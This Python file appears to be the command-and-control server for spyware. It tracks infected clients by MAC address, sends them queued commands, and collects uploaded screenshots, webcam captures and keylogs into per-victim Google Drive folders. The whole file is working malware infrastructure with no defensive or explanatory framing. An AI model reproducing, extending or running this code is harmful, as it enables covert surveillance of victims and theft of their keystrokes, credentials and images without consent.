from db_utils import load_db, update_db
from fastapi import Request
from driveapi import upload_file_from_file, create_folder
from typing import List, Dict

NO_COMMANDS = {'commands': ['no_commands']}
TEMP_FILE = 'temp'


def handle_first_command(request: Request) -> Dict[str, List[str]]:
    db = load_db()
    mac = request.headers['MAC-Address']
    date_time = request.headers['Date']
    if db.get(mac) is None:
        initialize_new_client(mac, date_time, db)
        return NO_COMMANDS
    else:
        db[mac]['last_datetime'] = date_time
        update_db(db)
        return get_commands(mac_address=mac, db=db)


def handle_command_request(request: Request) -> Dict[str, List[str]]:
    db = load_db()
    date_time = request.headers['Date']
    mac = request.headers['MAC-Address']
    db[mac]['last_datetime'] = date_time
    update_db(db)
    return get_commands(mac_address=mac, db=db)


def initialize_new_client(mac_address: str, datetime: str, db: dict) -> None:
    db[mac_address] = {
        'commands': [],
        'last_datetime': datetime,
        'screenshots_taken': 0,
        'webcam_shots_taken': 0,
        'keylogs_received': 0
    }
    update_db(db)
    create_folder(mac_address)


def get_commands(mac_address: str, db: dict) -> Dict[str, List[str]]:
    commands = db[mac_address]['commands']
    if not commands:
        return NO_COMMANDS
    else:
        db[mac_address]['commands'] = []
        update_db(db)
        return {'commands': commands}


async def upload_file(request: Request, filename: str, db_identifier: str,
                      file_type: str, remove_nulls: bool) -> None:
    data = await request.body()
    if remove_nulls:
        data = data.replace(b'\x00', b'')
    mac = request.headers['MAC-Address']
    db = load_db()
    title = f'{filename}{db[mac][db_identifier]}.{file_type}'
    with open(TEMP_FILE, 'wb') as f:
        f.write(data)
    db[mac][db_identifier] += 1
    update_db(db)
    upload_file_from_file(title=title, src_filename=TEMP_FILE,
                          mime_type=request.headers['Content-Type'], parent=mac)



